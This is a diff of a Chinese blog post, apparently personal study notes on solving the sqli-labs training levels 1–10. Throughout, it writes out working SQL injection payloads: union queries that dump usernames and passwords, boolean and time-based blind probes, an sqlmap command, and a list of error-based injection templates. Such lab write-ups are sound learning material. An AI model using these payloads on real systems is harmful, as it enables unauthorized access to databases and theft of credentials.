@@ -21,8 +21,8 @@
   
     <meta name="description" content="sqli开头简介sql注入我们可以理解为，通过构造恶意的输入，从而让程序执行我们想要执行的代码。所以我们需要了解源代码中的sql注入是什么样的语句什么样的过滤，但是在黑盒中我们无法了解代码，这便需要我们去有足够的知识积累，所以我打算将这个靶场打完，我要做sql领域大神🥰！ 前置知识点联合查询特点：1、要求多条查询语句的查询列数是一致的！2、要求多条查询语句的查询的每一列的类型和顺序最好一致3、u">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli练习">
-<meta property="og:url" content="http://example.com/2024/10/06/sqli%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:title" content="sqli1-10练习">
+<meta property="og:url" content="http://example.com/2024/11/24/sqli%E7%BB%83%E4%B9%A0/index.html">
 <meta property="og:site_name" content="fogpost&#96;s little blog">
 <meta property="og:description" content="sqli开头简介sql注入我们可以理解为，通过构造恶意的输入，从而让程序执行我们想要执行的代码。所以我们需要了解源代码中的sql注入是什么样的语句什么样的过滤，但是在黑盒中我们无法了解代码，这便需要我们去有足够的知识积累，所以我打算将这个靶场打完，我要做sql领域大神🥰！ 前置知识点联合查询特点：1、要求多条查询语句的查询列数是一致的！2、要求多条查询语句的查询的每一列的类型和顺序最好一致3、u">
 <meta property="og:locale" content="zh_CN">
@@ -33,8 +33,15 @@
 <meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202410060256922.png">
 <meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202410060259924.png">
 <meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202410060302469.png">
-<meta property="article:published_time" content="2024-10-05T18:34:33.000Z">
-<meta property="article:modified_time" content="2024-11-17T12:29:16.000Z">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411241656811.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411241658373.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411241701358.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411241707695.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411241709101.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411241654803.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411241703198.png">
+<meta property="article:published_time" content="2024-11-24T09:12:33.000Z">
+<meta property="article:modified_time" content="2024-12-09T11:45:12.000Z">
 <meta property="article:author" content="fogpost">
 <meta property="article:tag" content="sql">
 <meta name="twitter:card" content="summary_large_image">
@@ -45,7 +52,7 @@
     <!-- <meta name="referrer" content="no-referrer" /> -->
   
   
-  <title>sqli练习 - fogpost`s little blog</title>
+  <title>sqli1-10练习 - fogpost`s little blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -222,7 +229,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="sqli练习"></span>
+            <span id="subtitle" data-typed-text="sqli1-10练习"></span>
           
         </div>
 
@@ -233,8 +240,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-10-06 02:34" pubdate>
-          2024年10月6日 凌晨
+        <time datetime="2024-11-24 17:12" pubdate>
+          2024年11月24日 下午
         </time>
       </span>
     
@@ -245,7 +252,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.8k 字
+          2.4k 字
         
       </span>
     
@@ -256,7 +263,7 @@
         
         
         
-          16 分钟
+          21 分钟
         
       </span>
     
@@ -302,12 +309,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">sqli练习</h1>
+            <h1 id="seo-header">sqli1-10练习</h1>
             
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2024-11-17T20:29:16+08:00
+                    本文最后更新于 2024-12-09T19:45:12+08:00
                   
                   
 
@@ -322,7 +329,7 @@
 <p>version():查看数据库版本<br>database():查看使用的数据库<br>user():查看当前用户<br>limit:limit子句分批来获取所有数据<br>group_concat():一次性获取所有的数据库信息</p>
 <p>information_schema.tables:包含了数据库里所有的表<br>table_name:表名<br>table_schema:数据库名<br>column_name:字段名</p>
 <p>–dbs:是查看所有的数据库<br>–tables:是查看所有的表<br>–columns:是查看表中所有的字段名<br>–dump:是查询哪个表的数据</p>
-<h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><ol>
+<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><ol>
 <li>首先我们输入1，发现返回正常输入?id&#x3D;1’，返回错误，说明存在单引号注入<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060247359.png" srcset="/img/loading.gif" lazyload></li>
 <li>输入?id&#x3D;1’ and ‘1’&#x3D;’1，页面回显正常<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060248949.png" srcset="/img/loading.gif" lazyload></li>
 <li>构造?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 1–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 2–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 3–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 4–+　　出现报错界面<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060250107.png" srcset="/img/loading.gif" lazyload><br>所以我们了解到了数据库表只有三列，确定了字段数</li>
@@ -330,15 +337,29 @@
 <li>构造?id&#x3D;-1’ union select 1,database(),version()–+发现回显了数据库名称和版本信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060256922.png" srcset="/img/loading.gif" lazyload></li>
 <li>构造?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+发现回显了数据库中的表名<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060259924.png" srcset="/img/loading.gif" lazyload></li>
 <li>查询users的字段名?id&#x3D;-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;’users’–+<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060302469.png" srcset="/img/loading.gif" lazyload></li>
-<li>查询users表中的内容-1’ union select 1,2,group_concat(0x5c,username,0x5c,password) from users –+ 0x5c是反斜杠的十六进制，用于连接这两个库的数据内容</li>
+<li>查询users表中的内容-1’ union select 1,2,group_concat(0x5c,username,0x5c,password) from users –+ 0x5c是反斜杠的十六进制，用于连接这两个库的数据内容<br>这个是手工注入的基本，大部分的注入都是围绕上面来优化的</li>
 </ol>
-<h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><ol>
-<li>sqlmap -u <a target="_blank" rel="noopener" href="http://sql/sqli-labs-master/Less-1/">http://sql/sqli-labs-master/Less-1/</a> –dbs 查看对应的库</li>
-</ol>
+<h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><p>sqlmap -u <a target="_blank" rel="noopener" href="http://sql/sqli-labs-master/Less-1/id=1">http://sql/sqli-labs-master/Less-1/id=1</a> –dbs 查看对应的库<br>之后还会专门出一个sqlmap的教程，这里就不多说了</p>
 <h1 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h1><p>?id&#x3D;1’and length((select database()))&gt;9–+<br>#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4<br>?id&#x3D;1’and ascii(substr((select database()),1,1))&#x3D;115–+<br>#substr(“78909”,1,1)&#x3D;7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。</p>
 <p>?id&#x3D;1’and length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13–+<br>判断所有表名字符长度。<br>?id&#x3D;1’and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99–+<br>逐一判断表名</p>
 <p>?id&#x3D;1’and length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20–+<br>判断所有字段名的长度<br>?id&#x3D;1’and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99–+<br>逐一判断字段名。</p>
 <p>?id&#x3D;1’ and length((select group_concat(username,password) from users))&gt;109–+<br>判断字段内容长度<br>?id&#x3D;1’ and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50–+<br>逐一检测内容。</p>
+<h2 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiayun1995/article/details/86512290">参考文献</a><br>在了解了bool盲注的基本原理之后我们发现一个问题，手工注入必然会导致时间过程，于是应运而生，我们的双查询注入可以帮助我们避免长时间的枯燥操作直接获取数据库的信息，在讲解之前我们要先了解几个函数</p>
+<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>rand()：随机数函数 返回一个0到1的数<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241656811.png" srcset="/img/loading.gif" lazyload><br>floor()：向下取整，floor的向下取整可以帮我们进行去整处理，加入乘法便可以构建任意随机数选择<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241658373.png" srcset="/img/loading.gif" lazyload><br>concat()：字符串连接函数，用于连接我们查询到的数据<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241701358.png" srcset="/img/loading.gif" lazyload><br>group by：分组 as (_<em>别名)：给查询结果起别名(括号中为自定义的别名)<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241707695.png" srcset="/img/loading.gif" lazyload><br>count()：聚合函数<br>这里利用count(</em>)对前面的返回数据进行统计，由于group by 和随机数的原因，有可能会出现重复的键值，当键值重复时就会触发错误，然后报错，由于子查询在错误发生之前就已经完成，所以子查询的内容会随着报错信息一起显示出来<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241709101.png" srcset="/img/loading.gif" lazyload><br>我们这里需要的是第一次的报错，因为在实际过程中我们不可能查询到正确消息，只有在可能遇到错误时才会有返回值</p>
+<h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><p>子查询：内部查询，允许把另一个查询嵌套到当前的查询中</p>
+<blockquote>
+<p>MariaDB [dvwa]&gt; SELECT concat(“test: “,(select database())) as a;<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241654803.png" srcset="/img/loading.gif" lazyload><br>操作开始便会先查询(select database())，然后将查询结果与”test: “连接起来，最后返回结果。</p>
+</blockquote>
+<p>在注入的过程中我们不了解库名库表，可以借用information_schema的库来猜测，其中information_schema.schemata中包含了mysql的所有库名，information_schema.tables中包含了所有的表名，information_schema.columns中包含了所有的列名<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241703198.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="报错注入模板"><a href="#报错注入模板" class="headerlink" title="报错注入模板"></a>报错注入模板</h3><ul>
+<li>select 1&#x2F;0</li>
+<li>select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a</li>
+<li>extractvalue(1, concat(0x5c,(select user())))</li>
+<li>updatexml(0x3a,concat(1,(select user())),1)</li>
+<li>exp(~(SELECT * from(select user())a))</li>
+<li>ST_LatFromGeoHash((select * from(select * from(select user())a)b))</li>
+<li>GTID_SUBSET(version(), 1)</li>
+</ul>
 <h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>?id&#x3D;1’ and if(1&#x3D;1,sleep(5),1)–+<br>判断参数构造。<br>?id&#x3D;1’and if(length((select database()))&gt;9,sleep(5),1)–+<br>判断数据库名长度</p>
 <p>?id&#x3D;1’and if(ascii(substr((select database()),1,1))&#x3D;115,sleep(5),1)–+<br>逐一判断数据库字符<br>?id&#x3D;1’and if(length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13,sleep(5),1)–+<br>判断所有表名长度</p>
 <p>?id&#x3D;1’and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99,sleep(5),1)–+<br>逐一判断表名<br>?id&#x3D;1’and if(length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20,sleep(5),1)–+<br>判断所有字段名的长度</p>
@@ -406,8 +427,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>sqli练习</div>
-      <div>http://example.com/2024/10/06/sqli练习/</div>
+      <div>sqli1-10练习</div>
+      <div>http://example.com/2024/11/24/sqli练习/</div>
     </div>
     <div class="license-meta">
       
@@ -419,7 +440,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年10月6日</div>
+          <div>2024年11月24日</div>
         </div>
       
       
@@ -451,9 +472,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/10/15/wuai%E7%AC%AC%E5%85%AB%E8%AF%BE/" title="wuai第八课">
+                      <a href="/2024/11/27/web%E6%9D%82%E9%A1%B9/" title="web杂项">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">wuai第八课</span>
+                        <span class="hidden-mobile">web杂项</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -461,8 +482,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/10/01/sql/" title="sql">
-                        <span class="hidden-mobile">sql</span>
+                      <a href="/2024/11/23/dvwa%E5%85%A8%E8%A7%A3/" title="dvwa全解">
+                        <span class="hidden-mobile">dvwa全解</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
